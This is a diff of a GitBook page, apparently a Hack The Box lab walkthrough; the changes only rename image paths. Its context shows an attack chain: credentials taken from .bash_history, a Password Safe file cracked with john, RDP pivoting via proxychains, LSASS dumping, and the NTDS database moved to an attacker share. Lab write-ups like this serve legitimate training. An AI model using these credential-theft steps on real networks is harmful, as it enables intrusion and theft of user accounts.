@@ -62,11 +62,11 @@ jbetty@DMZ01:~$ whoami
 jbetty
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can see another connections in the ifconfig but... after searching something interesting for a while, we can found creds into the file .bash\_history -->
 
-<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `hwilliam : dealer-screwed-gym1`
 
@@ -164,7 +164,7 @@ Inspecting `Archive` I found the following:
 Employee-Passwords_OLD.psafe3       A     1080  Tue Apr 29 17:09:57 2025
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 I’ll get it and try to crack it using jhon because it is a psafe3 file (**Password Safe v3**) Fristly, we need extract the password hash -->
 
@@ -178,7 +178,7 @@ Now we can try to crack it -->
 john psafe.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 `password : michaeljackson`
 
@@ -193,13 +193,13 @@ NICE XDD so... it is very similar than a keepass, login in this .psafe3 -->
 pwsafe Employee-Passwords_OLD.psafe3
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 JUMMM DELICIOUSSSSS. We has here users credentialsssss
 
-<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Credentials Obtained
 
@@ -234,9 +234,9 @@ proxychains xfreerdp3 /v:172.16.119.7  /u:bdavid /p:'caramel-cigars-reply1' /cli
 
 Once we are connect to the machine, can get three file .pcap -->
 
-<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 the one that catches my attention the most is the dhcp.pcap, examite it using wireshark but... there are a rabbit hole so... now try to dump the LSASS -->
 
@@ -249,7 +249,7 @@ This requires us to:
 
 <figure><img src="../../../../.gitbook/assets/image (41) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now we need create a folder and make a new and best command for xfreerdp3 to create the share/folder connections -->
 
@@ -270,7 +270,7 @@ proxychains xfreerdp3 /v:172.16.119.7 /u:bdavid /p:'caramel-cigars-reply1' +clip
 
 > Note: Set well your directory
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 So... now we need open a new powershell and share this file, like this ->
 
@@ -374,7 +374,7 @@ Connect via RDP to this ip and share the folder, just in case
 proxychains xfreerdp3 /v:172.16.119.11 /u:stom /p:'calves-warp-learning1' /clipboard /drive:share,/home/htb-ac-489480/CompData
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We can start with looking at the local group membership using the command:
 
@@ -382,7 +382,7 @@ We can start with looking at the local group membership using the command:
 net localgroup
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 This is practically a victory beacuse we are in admin group, but we need the NTML hash of admin. How we are in admin group, can dump the NTDS and get the hashes -->
 
@@ -421,7 +421,7 @@ cmd.exe /c move C:\NTDS \\tsclient\share
 cmd.exe /c move C:\system.save \\tsclient\share
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Extract / decript using impacket-secretdump -->
 
